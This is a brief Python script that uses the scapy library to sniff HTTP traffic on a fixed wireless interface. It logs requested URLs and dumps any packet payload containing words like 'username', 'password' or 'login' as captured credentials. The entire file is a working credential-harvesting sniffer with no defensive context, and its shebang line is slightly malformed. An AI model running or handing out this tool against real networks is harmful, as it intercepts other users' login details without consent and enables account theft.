#!usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = [
            "username",
            "user",
            "password",
            "pass",
            "login",
        ]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(" - HTTP Request: " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print(
                "\n*****************************************************************************"
            )
            print(" - Possible username/password found: " + login_info)
            print(
                "*****************************************************************************\n"
            )


sniff("wlp0s20f3")
